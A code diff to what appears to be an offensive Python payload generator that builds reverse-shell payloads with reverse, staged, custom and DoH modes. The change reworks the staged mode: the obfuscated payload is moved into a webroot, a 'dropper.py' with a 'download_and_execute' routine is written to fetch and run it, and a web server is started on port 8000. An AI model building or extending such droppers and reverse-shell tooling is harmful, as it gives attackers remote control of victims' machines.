@@ -177,7 +177,7 @@ def validate_args(args):
         try:
             import socket
             socket.inet_aton(args.host)
-        except socket.error:
+        except OSError:
             print("[!] Invalid IP address format")
             return False
     
@@ -327,23 +327,22 @@ def execute_custom(args):
         return False
 
 def execute_staged(args):
-    """Execute staged payload generation."""
+    """Execute staged payload generation (reverse payload only; move/dropper done after post_process)."""
     if not args.quiet:
         print("[*] Creating staged payload")
-    
-    # First create the main payload
-    if not execute_reverse(args):
-        return False
-    
-    # Create webroot and move payload
-    os.makedirs("webroot", exist_ok=True)
+    # Create the main payload; webroot move and dropper are done after post_process in main_cli
+    return execute_reverse(args)
+
+
+def _staged_post_process(args):
+    """Move payload to webroot, create dropper, and start web server. Call after post_process for staged command."""
+    import shutil
     payload_file = f"{args.output}_or.py" if main_module.encrypted else f"{args.output}.py"
-    
-    if os.path.exists(payload_file):
-        import shutil
-        shutil.move(payload_file, f"webroot/{payload_file}")
-    
-    # Create dropper
+    results_dir = os.path.join(os.getcwd(), "results")
+    source = os.path.join(results_dir, payload_file) if os.path.exists(os.path.join(results_dir, payload_file)) else payload_file
+    os.makedirs("webroot", exist_ok=True)
+    if os.path.exists(source):
+        shutil.move(source, f"webroot/{payload_file}")
     dropper_code = f'''
 import requests
 import time
@@ -367,19 +366,13 @@ def download_and_execute():
 if __name__ == "__main__":
     download_and_execute()
 '''
-    
     with open("dropper.py", 'w') as f:
         f.write(dropper_code)
-    
-    # Start web server
     main_module.start_web_server("webroot")
-    
     if not args.quiet:
         print("[+] Staged payload created")
         print("[*] Dropper: dropper.py")
         print("[*] Web server started on port 8000")
-    
-    return True
 
 def execute_doh(args):
     """Execute DoH payload generation."""
@@ -564,6 +557,10 @@ def main_cli():
     
     # Post-processing
     post_process(args)
+    
+    # Staged: move payload to webroot and create dropper after obfuscation/compile
+    if args.command == 'staged':
+        _staged_post_process(args)
     
     # Start listener if needed (skip for DoH)
     if args.command != 'doh':
